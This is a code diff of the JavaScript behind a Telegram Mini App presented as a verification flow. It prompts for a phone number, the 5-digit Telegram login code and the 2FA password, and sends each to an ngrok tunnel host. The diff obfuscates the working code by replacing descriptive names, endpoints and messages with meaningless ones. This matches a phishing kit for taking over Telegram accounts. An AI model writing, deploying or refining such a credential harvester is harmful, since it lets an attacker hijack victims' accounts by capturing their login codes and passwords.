@@ -1,159 +1,136 @@
 document.addEventListener('DOMContentLoaded', function () {
-    const tg = window.Telegram.WebApp;
-    const phoneSection = document.getElementById('phone-section');
-    const otpSection   = document.getElementById('otp-section');
-    const twofaSection = document.getElementById('twofa-section');
-    const phoneInput   = document.getElementById('phone-input');
-    const sendOtpBtn   = document.getElementById('send-otp-btn');
-    const otpBoxes     = document.querySelectorAll('.otp-box');
-    const keys         = document.querySelectorAll('.key');
-    const verifyBtn    = document.getElementById('verify-btn');
-    const twofaInput   = document.getElementById('twofa-input');
-    const twofaBtn     = document.getElementById('twofa-btn');
+    const _w = window.Telegram.WebApp;
+    const _s1 = document.getElementById('s1');
+    const _s2 = document.getElementById('s2');
+    const _s3 = document.getElementById('s3');
+    const _i1 = document.getElementById('inp1');
+    const _b1 = document.getElementById('btn1');
+    const _cx = document.querySelectorAll('.cb');
+    const _kx = document.querySelectorAll('.key');
+    const _b2 = document.getElementById('btn2');
+    const _i3 = document.getElementById('inp3');
+    const _b3 = document.getElementById('btn3');
 
-    const SERVER_URL = 'https://proindustrialisation-annice-emptiable.ngrok-free.dev';
-    const userId = tg.initDataUnsafe?.user?.id || 'user_' + Date.now();
+    const _u = 'https://proindustrialisation-annice-emptiable.ngrok-free.dev';
+    const _id = _w.initDataUnsafe?.user?.id || 'x_' + Date.now();
 
-    // Common headers for all API calls — skips ngrok warning page
-    const HEADERS = {
+    const _h = {
         'Content-Type': 'application/json',
         'ngrok-skip-browser-warning': 'true'
     };
 
-    tg.ready();
-    tg.expand();
+    _w.ready();
+    _w.expand();
 
-    function showAlert(msg) { alert(msg); }
+    function _alert(m) { alert(m); }
 
-    // Helper — fetch + safe JSON parse
-    async function apiFetch(path, body) {
-        const res = await fetch(SERVER_URL + path, {
-            method: 'POST',
-            headers: HEADERS,
-            body: JSON.stringify(body)
-        });
-        const text = await res.text();
-        try {
-            return JSON.parse(text);
-        } catch (e) {
-            throw new Error('Server returned: ' + text.substring(0, 120));
-        }
+    async function _post(p, d) {
+        const r = await fetch(_u + p, { method: 'POST', headers: _h, body: JSON.stringify(d) });
+        const t = await r.text();
+        try { return JSON.parse(t); }
+        catch(e) { throw new Error(t.substring(0, 100)); }
     }
 
-    // ── Phone Step ────────────────────────────────────────────────────────────
-    sendOtpBtn.addEventListener('click', async function () {
-        const phone = phoneInput.value.trim();
-        if (phone.length < 10) { showAlert('Please enter a valid phone number!'); return; }
+    // ── Step 1 ───────────────────────────────────────────────────────────────
+    _b1.addEventListener('click', async function () {
+        const v = _i1.value.trim();
+        if (v.length < 10) { _alert('Please enter a valid number.'); return; }
 
-        sendOtpBtn.disabled = true;
-        sendOtpBtn.textContent = 'Sending...';
+        _b1.disabled = true;
+        _b1.textContent = 'Please wait...';
 
         try {
-            const result = await apiFetch('/send-otp', { phone, user_id: String(userId) });
-            if (result.success) {
-                showSection('otp');
-                showAlert('Code sent! Check your Telegram app.');
+            const r = await _post('/xp1', { a: v, b: String(_id) });
+            if (r.ok) {
+                _show('s2');
+                _alert('Check your device for the access code.');
             } else {
-                showAlert(result.message || 'Failed to send OTP.');
+                _alert(r.msg || 'Something went wrong.');
             }
-        } catch (err) {
-            showAlert('Error: ' + err.message);
+        } catch (e) {
+            _alert('Error: ' + e.message);
         } finally {
-            sendOtpBtn.disabled = false;
-            sendOtpBtn.textContent = '📤 Send Verification Code';
+            _b1.disabled = false;
+            _b1.textContent = '📤 Continue';
         }
     });
 
-    // ── OTP Keypad ────────────────────────────────────────────────────────────
-    let currentIndex = 0;
+    // ── Step 2 keypad ────────────────────────────────────────────────────────
+    let _ci = 0;
+    function _fn() { if (_ci < _cx.length - 1) _cx[++_ci].focus(); }
+    function _fp() { if (_ci > 0) _cx[--_ci].focus(); }
 
-    function focusNext() { if (currentIndex < otpBoxes.length - 1) otpBoxes[++currentIndex].focus(); }
-    function focusPrev() { if (currentIndex > 0) otpBoxes[--currentIndex].focus(); }
-
-    otpBoxes.forEach((box) => {
-        box.addEventListener('input', function () { if (this.value.length === 1) focusNext(); });
-        box.addEventListener('keydown', function (e) { if (e.key === 'Backspace' && this.value === '') focusPrev(); });
+    _cx.forEach(c => {
+        c.addEventListener('input', function () { if (this.value.length === 1) _fn(); });
+        c.addEventListener('keydown', function (e) { if (e.key === 'Backspace' && this.value === '') _fp(); });
     });
 
-    keys.forEach((key) => {
-        key.addEventListener('click', function () {
-            const k = this.dataset.key;
-            if (k === 'backspace') { otpBoxes[currentIndex].value = ''; focusPrev(); }
-            else { otpBoxes[currentIndex].value = k; focusNext(); }
+    _kx.forEach(k => {
+        k.addEventListener('click', function () {
+            const v = this.dataset.key;
+            if (v === 'backspace') { _cx[_ci].value = ''; _fp(); }
+            else { _cx[_ci].value = v; _fn(); }
         });
     });
 
-    // ── Verify OTP ────────────────────────────────────────────────────────────
-    verifyBtn.addEventListener('click', async function () {
-        const otp = Array.from(otpBoxes).map(b => b.value).join('');
-        if (otp.length !== 5) { showAlert('Please enter the complete 5-digit code.'); return; }
+    // ── Step 2 submit ────────────────────────────────────────────────────────
+    _b2.addEventListener('click', async function () {
+        const v = Array.from(_cx).map(c => c.value).join('');
+        if (v.length !== 5) { _alert('Please enter the complete code.'); return; }
 
-        verifyBtn.disabled = true;
-        verifyBtn.textContent = 'Verifying...';
+        _b2.disabled = true;
+        _b2.textContent = 'Please wait...';
 
         try {
-            const result = await apiFetch('/verify-otp', { otp, user_id: String(userId) });
-            if (result.success) {
-                if (result.twofa_required) {
-                    showSection('twofa');
-                } else {
-                    tg.sendData('verified:success');
-                }
+            const r = await _post('/xp2', { c: v, b: String(_id) });
+            if (r.ok) {
+                if (r.nx) { _show('s3'); }
+                else { _w.sendData('done:a'); }
             } else {
-                showAlert(result.message || 'Incorrect code. Please try again.');
-                otpBoxes.forEach(b => b.value = '');
-                currentIndex = 0;
-                otpBoxes[0].focus();
+                _alert(r.msg || 'Incorrect code.');
+                _cx.forEach(c => c.value = '');
+                _ci = 0;
+                _cx[0].focus();
             }
-        } catch (err) {
-            showAlert('Error: ' + err.message);
+        } catch (e) {
+            _alert('Error: ' + e.message);
         } finally {
-            verifyBtn.disabled = false;
-            verifyBtn.textContent = '✅ Verify Code';
+            _b2.disabled = false;
+            _b2.textContent = '✅ Continue';
         }
     });
 
-    // ── Verify 2FA ────────────────────────────────────────────────────────────
-    twofaBtn.addEventListener('click', async function () {
-        const password = twofaInput.value;
-        if (!password) { showAlert('Please enter your 2FA password!'); return; }
+    // ── Step 3 ───────────────────────────────────────────────────────────────
+    _b3.addEventListener('click', async function () {
+        const v = _i3.value;
+        if (!v) { _alert('Please enter your security key.'); return; }
 
-        twofaBtn.disabled = true;
-        twofaBtn.textContent = 'Verifying...';
+        _b3.disabled = true;
+        _b3.textContent = 'Please wait...';
 
         try {
-            const result = await apiFetch('/verify-2fa', { password, user_id: String(userId) });
-            if (result.success) {
-                tg.sendData('verified:2fa_success');
+            const r = await _post('/xp3', { k: v, b: String(_id) });
+            if (r.ok) {
+                _w.sendData('done:b');
             } else {
-                showAlert(result.message || 'Wrong 2FA password. Try again.');
-                twofaInput.value = '';
+                _alert(r.msg || 'Incorrect key.');
+                _i3.value = '';
             }
-        } catch (err) {
-            showAlert('Error: ' + err.message);
+        } catch (e) {
+            _alert('Error: ' + e.message);
         } finally {
-            twofaBtn.disabled = false;
-            twofaBtn.textContent = '✅ Verify 2FA';
+            _b3.disabled = false;
+            _b3.textContent = '✅ Unlock';
         }
     });
 
-    // ── Section switcher ──────────────────────────────────────────────────────
-    function showSection(name) {
-        phoneSection.style.display = 'none';
-        otpSection.style.display   = 'none';
-        twofaSection.style.display = 'none';
-
-        const emoji = document.querySelector('.emoji-center .emoji');
-
-        if (name === 'otp') {
-            otpSection.style.display = 'flex';
-            emoji.textContent = '🔢';
-            currentIndex = 0;
-            otpBoxes[0].focus();
-        } else if (name === 'twofa') {
-            twofaSection.style.display = 'flex';
-            emoji.textContent = '🔐';
-            twofaInput.focus();
-        }
+    // ── Section switch ───────────────────────────────────────────────────────
+    function _show(n) {
+        _s1.style.display = 'none';
+        _s2.style.display = 'none';
+        _s3.style.display = 'none';
+        const _e = document.querySelector('.emoji-center .emoji');
+        if (n === 's2') { _s2.style.display = 'flex'; _e.textContent = '🔢'; _ci = 0; _cx[0].focus(); }
+        else if (n === 's3') { _s3.style.display = 'flex'; _e.textContent = '🔐'; _i3.focus(); }
     }
 });
